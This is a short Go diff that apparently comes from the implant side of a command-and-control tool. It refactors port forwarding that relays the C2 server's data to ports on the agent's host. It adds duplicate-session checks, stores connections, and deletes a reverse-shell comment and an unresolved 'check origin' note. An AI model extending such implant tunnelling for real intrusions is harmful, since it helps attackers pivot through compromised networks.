@@ -17,6 +17,8 @@ import (
 
 // PortFwdSession manage a port fwd session
 type PortFwdSession struct {
+	ToPort string
+	Conn   *h2conn.Conn
 	Ctx    context.Context
 	Cancel context.CancelFunc
 }
@@ -67,6 +69,14 @@ func socks5Start() {
 
 // PortFwd port mapping, receive CC's request data then send it to target port on agent
 func PortFwd(toPort, sessionID string) (err error) {
+	// ignore if a session already exists
+	for _, s := range PortFwds {
+		if s.ToPort == toPort {
+			log.Printf("%s duplicated session", toPort)
+			return
+		}
+	}
+
 	var (
 		session PortFwdSession
 
@@ -78,7 +88,7 @@ func PortFwd(toPort, sessionID string) (err error) {
 		recvcc = make(chan []byte)
 
 		// connection
-		conn   *h2conn.Conn // reverse shell uses this connection
+		conn   *h2conn.Conn
 		ctx    context.Context
 		cancel context.CancelFunc
 	)
@@ -102,6 +112,8 @@ func PortFwd(toPort, sessionID string) (err error) {
 	}()
 
 	// save this session
+	session.ToPort = toPort
+	session.Conn = conn
 	session.Ctx = ctx
 	session.Cancel = cancel
 	PortFwds[sessionID] = &session
@@ -140,9 +152,6 @@ func PortFwd(toPort, sessionID string) (err error) {
 				cancel()
 				return
 			}
-
-			// FIXME check origin
-			log.Printf("reading from h2conn: %s, to port %s", sessionID, toPort)
 
 			recvcc <- data
 		}
